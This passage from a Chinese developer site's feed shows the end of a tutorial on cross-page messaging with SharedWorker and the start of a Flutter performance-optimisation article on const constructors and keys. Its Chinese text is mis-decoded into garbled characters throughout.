    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"sendToPageB()"</span>&gt;</span>å‘ç»™é¡µé¢B<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"log"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-comment">// é¡µé¢å”¯ä¸€æ ‡è¯†</span>
        <span class="hljs-keyword">const</span> pageId = <span class="hljs-string">'page-123'</span>;
        <span class="hljs-comment">// 1. åˆ›å»ºSharedWorkerå®ä¾‹ï¼ŒæŒ‡å®šWorkerè„šæœ¬è·¯å¾„</span>
        <span class="hljs-keyword">const</span> worker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedWorker</span>(<span class="hljs-string">'./share.js'</span>);
        <span class="hljs-comment">// 2. è·å–ä¸Workerçš„é€šè®¯ç«¯å£</span>
        <span class="hljs-keyword">const</span> port = worker.<span class="hljs-property">port</span>;

        <span class="hljs-comment">// 3. å…è®¸ç«¯å£é€šè®¯ï¼ˆå¿…é¡»åœ¨ç›‘å¬å™¨ä¹‹å‰è°ƒç”¨ï¼‰</span>
        port.<span class="hljs-title function_">start</span>();

        <span class="hljs-comment">// 4. ç›‘å¬Workerå‘æ¥çš„æ¶ˆæ¯ï¼ˆä½¿ç”¨onmessageæ›´å¯é ï¼‰</span>
        port.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">msg</span>) =&gt;</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'é¡µé¢Aæ”¶åˆ°æ¶ˆæ¯:'</span>, msg.<span class="hljs-property">data</span>);
            <span class="hljs-keyword">const</span> log = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'log'</span>);
            log.<span class="hljs-property">innerHTML</span> += <span class="hljs-string">`&lt;p&gt;æ”¶åˆ°ï¼š<span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(msg.data)}</span>&lt;/p&gt;`</span>;
        };

        <span class="hljs-comment">// 5. è¿æ¥æˆåŠŸåç«‹å³å‘é€æ³¨å†Œæ¶ˆæ¯</span>
        port.<span class="hljs-title function_">postMessage</span>({
            <span class="hljs-attr">type</span>: <span class="hljs-string">'register'</span>,
            <span class="hljs-attr">pageId</span>: pageId
        });

        <span class="hljs-comment">// å‘é€å¹¿æ’­æ¶ˆæ¯</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendBroadcast</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'msgInput'</span>);
            port.<span class="hljs-title function_">postMessage</span>({
                <span class="hljs-attr">type</span>: <span class="hljs-string">'broadcast'</span>,
                <span class="hljs-attr">pageId</span>: pageId,
                <span class="hljs-attr">data</span>: input.<span class="hljs-property">value</span>
            });
        }

        <span class="hljs-comment">// å‘é€ç‚¹å¯¹ç‚¹æ¶ˆæ¯ç»™é¡µé¢Bï¼ˆé¡µé¢Bæ ‡è¯†ä¸ºpage-456ï¼‰</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendToPageB</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'msgInput'</span>);
            port.<span class="hljs-title function_">postMessage</span>({
                <span class="hljs-attr">type</span>: <span class="hljs-string">'private'</span>,
                <span class="hljs-attr">pageId</span>: pageId,
                <span class="hljs-attr">target</span>: <span class="hljs-string">'page-456'</span>,
                <span class="hljs-attr">data</span>: input.<span class="hljs-property">value</span>
            });
        }

        <span class="hljs-comment">// é¡µé¢å…³é—­æ—¶æ–­å¼€è¿æ¥</span>
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'beforeunload'</span>, <span class="hljs-function">() =&gt;</span> {
            port.<span class="hljs-title function_">close</span>();
        });
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span>
</code></pre>
<h3 data-id="heading-6">3.3 å®é™…è°ƒè¯•</h3>
<h4 data-id="heading-7">3.3.1 å¦‚ä½•è°ƒè¯•share.js</h4>
<p>é€šè¿‡Chromeå¦‚ä½•æŸ¥çœ‹share.jsä¸­æ‰“å°çš„æ•°æ®ï¼Œé¡µé¢æ˜¯æ— æ³•è®¿é—®çš„ï¼Œå› ä¸ºå®ƒæ˜¯ç‹¬ç«‹çš„æ§åˆ¶å°ã€‚</p>
<p>ä¸ºä»€ä¹ˆæ§åˆ¶å°è¦ç‹¬ç«‹ï¼Ÿè¿™æ˜¯å› ä¸ºSharedWorkerè¿è¡Œåœ¨ä¸é¡µé¢ä¸»çº¿ç¨‹å®Œå…¨éš”ç¦»çš„ç‹¬ç«‹çº¿ç¨‹ä¸­ï¼Œä»æµè§ˆå™¨æ¶æ„å’Œå®‰å…¨è®¾è®¡å‡ºå‘ï¼Œå…¶æ§åˆ¶å°è¾“å‡ºä¹Ÿéœ€ä¸é¡µé¢çº¿ç¨‹åˆ†ç¦»ï¼Œé¿å…çº¿ç¨‹é—´çš„ä¿¡æ¯å¹²æ‰°ã€‚</p>
<p>æ‰“å¼€æ­¥éª¤ï¼š</p>
<ol>
<li>åœ¨Chromeæµè§ˆå™¨ä¸­ç›´æ¥è®¿é—®åœ°å€ï¼š<code>chrome://inspect/#workers</code>ï¼›</li>
<li>é¡µé¢ä¼šåˆ—å‡ºå½“å‰æµè§ˆå™¨ä¸­æ‰€æœ‰è¿è¡Œçš„Workerå®ä¾‹ï¼Œæ‰¾åˆ°ç›®æ ‡SharedWorkerå¯¹åº”çš„â€œinspectâ€é“¾æ¥å¹¶ç‚¹å‡»ï¼Œå³å¯æ‰“å¼€ä¸“å±æ§åˆ¶å°ã€‚</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0367fedb6578405488845baad6207d68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766346742&amp;x-signature=670jd6YcO%2BHlhidyWmF42YmSoAI%3D" alt="image.png" loading="lazy"/></p>
<p>æ§åˆ¶å°æ‰“å°ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55752a2673c6447f9641aeb5c2b200fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766346742&amp;x-signature=GVYG7J6L97MBleOUS4skIH8LGrE%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-8">3.3.2 é¡µé¢å‘é€å¹¿æ’­æˆ–ç§å‘æ¶ˆæ¯</h4>
<ol>
<li>å°†share.jsã€pageA.htmlã€pageB.htmléƒ¨ç½²åˆ°åŒä¸€åŸŸåä¸‹ï¼ˆæœ¬åœ°å¯ç”¨live-serverå¯åŠ¨ï¼‰ã€‚</li>
<li>åŒæ—¶æ‰“å¼€ä¸¤ä¸ªé¡µé¢ï¼Œåœ¨é¡µé¢Aè¾“å…¥æ¶ˆæ¯å¹¶ç‚¹å‡»â€œå¹¿æ’­æ¶ˆæ¯â€ï¼Œä¸¤ä¸ªé¡µé¢éƒ½ä¼šæ”¶åˆ°Workerè½¬å‘çš„æ¶ˆæ¯ã€‚</li>
<li>ç‚¹å‡»â€œå‘ç»™é¡µé¢Bâ€ï¼Œåªæœ‰é¡µé¢Bä¼šæ”¶åˆ°æ¶ˆæ¯ï¼Œå®ç°ç‚¹å¯¹ç‚¹é€šè®¯ã€‚</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a0ca92941294eba87d97406014ae91c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766346742&amp;x-signature=1UF5PPl%2F2pG4t1Ao%2F1AmoQCgCDg%3D" alt="image.png" loading="lazy"/></p>
<p>é¡µé¢å…³é—­ï¼Œè‡ªåŠ¨é”€æ¯</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b49f7ef884184332bde92a850938643d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766346742&amp;x-signature=gkhJqsST35sAFd6YZWLwtxwFeIc%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-9">4ã€SharedWorkerçš„æ³¨æ„äº‹é¡¹</h2>
<h3 data-id="heading-10">4.1 åŒæºç­–ç•¥é™åˆ¶ä¸¥æ ¼</h3>
<p>SharedWorkerçš„åŒæºé™åˆ¶æ¯”æ™®é€šWorkeræ›´ä¸¥æ ¼ï¼š<strong>åè®®ã€åŸŸåã€ç«¯å£å¿…é¡»å®Œå…¨ä¸€è‡´</strong>ï¼Œå³ä½¿æ˜¯å­åŸŸåï¼ˆå¦‚a.example.comå’Œb.example.comï¼‰ä¹Ÿæ— æ³•å…±äº«ã€‚</p>
<h3 data-id="heading-11">4.2 å¿…é¡»éƒ¨ç½²æ‰èƒ½è¿è¡Œï¼Œæœ¬åœ°ç›´æ¥æ‰“å¼€æ— æ•ˆ</h3>
<p>ç”±äºæµè§ˆå™¨çš„å®‰å…¨é™åˆ¶ï¼Œç›´æ¥åŒå‡»æœ¬åœ°HTMLæ–‡ä»¶ï¼ˆfile://åè®®ï¼‰åˆ›å»ºSharedWorkerä¼šæŠ¥é”™ã€‚å¿…é¡»é€šè¿‡HTTP/HTTPSåè®®éƒ¨ç½²ï¼Œæœ¬åœ°å¯ä½¿ç”¨live-serverã€http-serverç­‰å·¥å…·å¯åŠ¨æœåŠ¡ã€‚</p>
<h3 data-id="heading-12">4.3 ç«¯å£é€šè®¯éœ€â€œåŒå‘å¯åŠ¨â€</h3>
<p>é¡µé¢ç«¯å’ŒWorkerç«¯çš„<code>port.start()</code>å¿…é¡»éƒ½è°ƒç”¨ï¼Œå¦åˆ™æ— æ³•æ­£å¸¸æ”¶å‘æ¶ˆæ¯ã€‚å°¤å…¶æ˜¯åœ¨ä½¿ç”¨<code>addEventListener</code>ç»‘å®šæ¶ˆæ¯äº‹ä»¶æ—¶ï¼Œè¿™ä¸€æ­¥ä¸èƒ½çœç•¥ï¼ˆè‹¥ç”¨<code>onmessage</code>å±æ€§ç»‘å®šï¼Œéƒ¨åˆ†æµè§ˆå™¨ä¼šè‡ªåŠ¨å¯åŠ¨ï¼Œä½†å»ºè®®ç»Ÿä¸€è°ƒç”¨start()ï¼‰ã€‚</p>
<h3 data-id="heading-13">4.4 æ¶ˆæ¯æ•°æ®éœ€å¯åºåˆ—åŒ–</h3>
<p>é€šè¿‡portä¼ é€’çš„æ¶ˆæ¯æ•°æ®ï¼Œå¿…é¡»æ˜¯å¯ç»“æ„åŒ–å…‹éš†çš„ç±»å‹ï¼ˆå¦‚å¯¹è±¡ã€æ•°ç»„ã€å­—ç¬¦ä¸²ç­‰ï¼‰ï¼Œä¸èƒ½ä¼ é€’å‡½æ•°ã€DOMå…ƒç´ ç­‰ä¸å¯åºåˆ—åŒ–çš„æ•°æ®ã€‚è‹¥éœ€ä¼ é€’å¤æ‚æ•°æ®ï¼Œå¯å…ˆè½¬ä¸ºJSONå­—ç¬¦ä¸²ï¼Œæ¥æ”¶åå†è§£æã€‚</p>
<h2 data-id="heading-14">5. æ€»ç»“</h2>
<p>æœ€åæ€»ç»“ä¸€ä¸‹ï¼š<code>SharedWorker</code>æ˜¯ä¸€ä¸ªèƒ½è¢«åŒæºå¤šé¡µé¢å…±äº«çš„åå°çº¿ç¨‹ï¼Œå®ƒé€šè¿‡â€œå•ä¸€å®ä¾‹+ç®¡ç†å¤šç«¯å£â€çš„æ¨¡å¼ï¼Œå®ç°è·¨é¡µé¢é€šä¿¡ä¸æ•°æ®ååŒã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€ŠFlutterå…¨æ ˆå¼€å‘å®æˆ˜æŒ‡å—ï¼šä»é›¶åˆ°é«˜çº§ã€‹- 25 -æ€§èƒ½ä¼˜åŒ–]]></title>    <link>https://juejin.cn/post/7584043969687027764</link>    <guid>https://juejin.cn/post/7584043969687027764</guid>    <pubDate>2025-12-16T06:46:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584043969687027764" data-draft-id="7584013833993519138" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€ŠFlutterå…¨æ ˆå¼€å‘å®æˆ˜æŒ‡å—ï¼šä»é›¶åˆ°é«˜çº§ã€‹- 25 -æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="keywords" content="Flutter,Android,iOS"/> <meta itemprop="datePublished" content="2025-12-16T06:46:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="QuantumLeapä¸¶"/> <meta itemprop="url" content="https://juejin.cn/user/1767603104125197"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€ŠFlutterå…¨æ ˆå¼€å‘å®æˆ˜æŒ‡å—ï¼šä»é›¶åˆ°é«˜çº§ã€‹- 25 -æ€§èƒ½ä¼˜åŒ–
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1767603104125197/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    QuantumLeapä¸¶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:46:07.000Z" title="Tue Dec 16 2025 06:46:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<blockquote>
<p>å½“ç”¨æˆ·è¯´æŸä¸ªAppç”¨èµ·æ¥å¾ˆå¡æ—¶ï¼Œä»–ä»¬çœŸæ­£æŠ±æ€¨çš„æ˜¯ä»€ä¹ˆï¼Ÿ
ä¸æ˜¯CPUä½¿ç”¨ç‡ï¼Œä¸æ˜¯å†…å­˜å ç”¨ï¼Œç”šè‡³ä¸æ˜¯å¸§ç‡æ•°å­—ã€‚ç”¨æˆ·æ„Ÿå—åˆ°çš„æ˜¯<code>å“åº”å»¶è¿Ÿ</code>ã€<code>ç•Œé¢è·³å¸§</code>å’Œ<code>æ“ä½œä¸è·Ÿæ‰‹</code>ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬è¦åšæ€§èƒ½ä¼˜åŒ–â€”â€”ä¸æ˜¯ä¸ºäº†è®©æ•°å­—å¥½çœ‹ï¼Œè€Œæ˜¯ä¸ºäº†è®©ç”¨æˆ·æ„ŸçŸ¥æµç•…ã€‚</p>
</blockquote>
<p>æ ¹æ®Googleçš„ç”¨æˆ·ä½“éªŒç ”ç©¶ï¼š</p>
<ul>
<li>100mså†…å“åº”ï¼šç”¨æˆ·æ„Ÿè§‰ç¬é—´å®Œæˆï¼›</li>
<li>1ç§’å†…å“åº”ï¼šç”¨æˆ·æ„Ÿè§‰æµç•…è‡ªç„¶ï¼›</li>
<li>1-3ç§’å“åº”ï¼šç”¨æˆ·å¼€å§‹æ³¨æ„åˆ°å»¶è¿Ÿï¼›</li>
<li>3ç§’ä»¥ä¸Šå“åº”ï¼šç”¨æˆ·æ„Ÿåˆ°ä¸è€çƒ¦ï¼Œé¢ä¸´å¸è½½çš„å¯èƒ½ï¼›</li>
</ul>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬å°†ä»å¤šä¸ªç»´åº¦ï¼Œæ·±å…¥ç†è§£Flutteræ€§èƒ½ä¼˜åŒ–çš„<strong>æ˜¯ä»€ä¹ˆ</strong>ã€<strong>ä¸ºä»€ä¹ˆ</strong>å’Œ<strong>æ€ä¹ˆåš</strong>ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€ä¼˜åŒ–æ„å»ºæ€§èƒ½</h3>
<h4 data-id="heading-2">æ˜¯ä»€ä¹ˆå¯¼è‡´äº†æ„å»ºæ€§èƒ½é—®é¢˜ï¼Ÿ</h4>
<p>è®©æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€å¼ æ„å»ºæµç¨‹å›¾ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[setStateè°ƒç”¨] --&gt; B[Widgetæ ‘é‡å»º]
    B --&gt; C[Elementæ ‘æ›´æ–°]
    C --&gt; D[RenderObjectæ›´æ–°]
    D --&gt; E[å¸ƒå±€è®¡ç®—]
    E --&gt; F[ç»˜åˆ¶æ‰§è¡Œ]
    
    G[æ€§èƒ½ç“¶é¢ˆæ¥æº] --&gt; H[è¿‡åº¦é‡å»º]
    G --&gt; I[å¤æ‚è®¡ç®—]
    G --&gt; J[æ·±åº¦åµŒå¥—]
    G --&gt; K[ä¸å½“çš„Keyä½¿ç”¨]
</code></pre>
<h4 data-id="heading-3">ä¼˜åŒ–æ‰‹æ®µ1ï¼šconstæ„é€ å‡½æ•° - ç¼–è¯‘æœŸä¼˜åŒ–</h4>
<p><strong>æ˜¯ä»€ä¹ˆ</strong>ï¼šconstæ„é€ å‡½æ•°åˆ›å»ºçš„Widgetåœ¨ç¼–è¯‘æ—¶ç¡®å®šï¼Œè¿è¡Œæ—¶ä¸ä¼šé‡å¤æ„å»ºã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆé‡è¦</strong>ï¼š</p>
<ul>
<li>é¿å…ä¸å¿…è¦çš„Widgetå®ä¾‹åˆ›å»º</li>
<li>å‡å°‘åƒåœ¾å›æ”¶å‹åŠ›</li>
<li>æé«˜çƒ­é‡è½½æ€§èƒ½</li>
</ul>
<p><strong>æ€ä¹ˆåš</strong>ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// ä¸æ¨èï¼šæ¯æ¬¡buildéƒ½åˆ›å»ºæ–°å¯¹è±¡</span>
Widget build(BuildContext context) {
  <span class="hljs-keyword">return</span> Container(
    padding: EdgeInsets.all(<span class="hljs-number">16</span>), <span class="hljs-comment">// æ¯æ¬¡åˆ›å»ºæ–°EdgeInsets</span>
    child: Text(<span class="hljs-string">'æ ‡é¢˜'</span>, style: TextStyle(fontSize: <span class="hljs-number">18</span>)), <span class="hljs-comment">// æ¯æ¬¡åˆ›å»ºæ–°TextStyle</span>
  );
}

<span class="hljs-comment">// ä¼˜åŒ–å†™æ³•ï¼šä½¿ç”¨const</span>
Widget build(BuildContext context) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">const</span> Padding(
    padding: EdgeInsets.all(<span class="hljs-number">16</span>), <span class="hljs-comment">// const EdgeInsets</span>
    child: Text(
      <span class="hljs-string">'æ ‡é¢˜'</span>,
      style: TextStyle(fontSize: <span class="hljs-number">18</span>),
    ),
  );
}

<span class="hljs-comment">// æ¨èï¼šæå–å¸¸é‡</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OptimizedWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> _padding = EdgeInsets.all(<span class="hljs-number">16</span>);
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> _textStyle = TextStyle(fontSize: <span class="hljs-number">18</span>);
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">const</span> Padding(
      padding: _padding,
      child: Text(<span class="hljs-string">'æ ‡é¢˜'</span>, style: _textStyle),
    );
  }
}
</code></pre>
<p><strong>æ³¨æ„ç‚¹</strong>ï¼š</p>
<ul>
<li>conståªèƒ½ç”¨äºå‚æ•°åœ¨ç¼–è¯‘æ—¶å¯ç¡®å®šçš„Widget</li>
<li>å¸¦å›è°ƒå‡½æ•°çš„Widgetä¸èƒ½ä½¿ç”¨const</li>
<li>åˆ—è¡¨ä¸­çš„itemä½¿ç”¨constæ•ˆæœæœ€æ˜æ˜¾</li>
</ul>
<h4 data-id="heading-4">ä¼˜åŒ–æ‰‹æ®µ2ï¼šKeyçš„æ­£ç¡®ä½¿ç”¨ - æ§åˆ¶Elementå¤ç”¨</h4>
<p><strong>æ˜¯ä»€ä¹ˆ</strong>ï¼šKeyå¸®åŠ©Flutterè¯†åˆ«Widgetçš„èº«ä»½ï¼Œå†³å®šæ˜¯å¦å¤ç”¨Elementã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆé‡è¦</strong>ï¼š</p>
<ul>
<li>é”™è¯¯çš„Keyå¯¼è‡´ä¸å¿…è¦çš„Elementé‡å»º</li>
<li>æ­£ç¡®çš„Keyä¿æŒçŠ¶æ€åœ¨Widgetç§»åŠ¨æ—¶ä¸è¢«ä¸¢å¤±</li>
</ul>
<p><strong>å¦‚ä½•é€‰æ‹©Keyç±»å‹ï¼Ÿ</strong></p>



































<table><thead><tr><th>Keyç±»å‹</th><th>é€‚ç”¨åœºæ™¯</th><th>æ³¨æ„ç‚¹</th></tr></thead><tbody><tr><td>ValueKey</td><td>åŸºäºå€¼çš„å”¯ä¸€æ ‡è¯†</td><td>å€¼å˜åŒ–æ—¶çŠ¶æ€é‡ç½®</td></tr><tr><td>ObjectKey</td><td>åŸºäºå¯¹è±¡çš„å”¯ä¸€æ ‡è¯†</td><td>é€‚åˆå¯¹è±¡åˆ—è¡¨</td></tr><tr><td>UniqueKey</td><td>ç»å¯¹å”¯ä¸€æ ‡è¯†</td><td>æ¯æ¬¡é‡å»ºéƒ½ä¸åŒ</td></tr><tr><td>GlobalKey</td><td>å…¨å±€å”¯ä¸€æ ‡è¯†</td><td>è°¨æ…ä½¿ç”¨ï¼Œæ€§èƒ½å¼€é”€å¤§</td></tr><tr><td>PageStorageKey</td><td>ä¿æŒæ»šåŠ¨ä½ç½®</td><td>ç”¨äºå¯æ»šåŠ¨åˆ—è¡¨</td></tr></tbody></table>
<p><strong>æ€ä¹ˆåš</strong>ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KeyOptimizationDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _KeyOptimizationDemoState createState() =&gt; _KeyOptimizationDemoState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_KeyOptimizationDemoState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">KeyOptimizationDemo</span>&gt; </span>{
  <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">String</span>&gt; items = [<span class="hljs-string">'A'</span>, <span class="hljs-string">'B'</span>, <span class="hljs-string">'C'</span>];
  
  <span class="hljs-keyword">void</span> _reverseList() {
    setState(() {
      items = items.reversed.toList();
    });
  }
  
  <span class="hljs-meta">@override</span>
